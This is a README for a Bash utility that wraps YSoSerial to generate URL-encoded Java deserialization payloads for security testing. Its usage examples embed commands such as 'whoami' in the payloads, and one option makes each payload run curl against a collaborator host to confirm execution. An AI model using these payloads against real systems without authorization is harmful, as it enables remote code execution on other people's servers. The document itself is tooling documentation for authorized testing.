# ysoserial-generator

A small Bash utility for generating serialized Java payloads using the YSoSerial payload list and encoding them for use in deserialization testing scenarios.

## What this repository contains

- `generate_payloads.sh` — generates URL-encoded serialized payloads for each payload in `payloads.txt`
- `payloads.txt` — list of supported YSoSerial gadget chains
- `serialized_payloads` — output file created when the generator is run

## Requirements

- Bash
- Java 11 (`java11` command available in PATH)
- PHP CLI
- A working YSoSerial jar named `ysoserial-all.jar` in the same directory

## Usage

Run the script with a command to execute:

```bash
./generate_payloads.sh 'whoami'
```

Generate payloads that call `curl` against a collaborator URL:

```bash
./generate_payloads.sh --curl 'collaborator-link'
```

Use a custom command instead of `curl`:

```bash
./generate_payloads.sh --request 'curl' 'collaborator-link'
```

The script creates a `serialized_payloads` file containing the generated payloads.

## Example

```bash
./generate_payloads.sh --curl 'example.seize-collaborator.com'
```

This will generate payloads that attempt to invoke:

```bash
curl <payload-name>.example.seize-collaborator.com
```

## Notes

This project is intended for authorized security research, red team exercises, and controlled testing environments only. Use it only on systems you own or are explicitly authorized to test.
